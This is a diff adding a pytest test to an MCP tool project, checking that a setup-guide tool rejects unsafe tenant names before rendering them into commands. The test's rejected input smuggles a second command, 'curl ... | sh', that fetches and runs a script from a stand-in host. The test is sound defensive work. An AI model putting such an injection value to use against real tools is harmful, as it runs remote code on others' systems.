@@ -79,3 +79,32 @@ def test_doc_lists_exactly_the_non_read_only_tools() -> None:
         item["name"] for item in iter_tool_specs(include_response=True) if not item["readOnlyHint"]
     }
     assert listed == actual
+
+
+def test_setup_guide_validates_its_tenant_name_like_the_run_tools(tmp_path, monkeypatch) -> None:
+    """R097: the setup guide renders tenant_name into commands; it is checked like the run tools' tenant names."""
+    import pytest
+
+    from auditex.mcp_paths import McpPathError
+
+    by_name = {item["name"]: item for item in iter_tool_specs()}
+    assert "tenant_name" in by_name["auditex_setup_guide"]["nameArguments"]
+
+    class _Server:
+        def __init__(self) -> None:
+            self.tools: dict = {}
+
+        def tool(self, **metadata):
+            def decorator(func):
+                self.tools[metadata["name"]] = func
+                return func
+
+            return decorator
+
+    from auditex.mcp_server import tool_handlers
+
+    server = _Server()
+    register_fastmcp_tools(server, tool_handlers())
+    with pytest.raises(McpPathError):
+        server.tools["auditex_setup_guide"](provider="m365", tenant_name="acme; curl -s https://x.example/p | sh")
+    assert server.tools["auditex_setup_guide"](provider="m365", tenant_name="acme")["commands"]
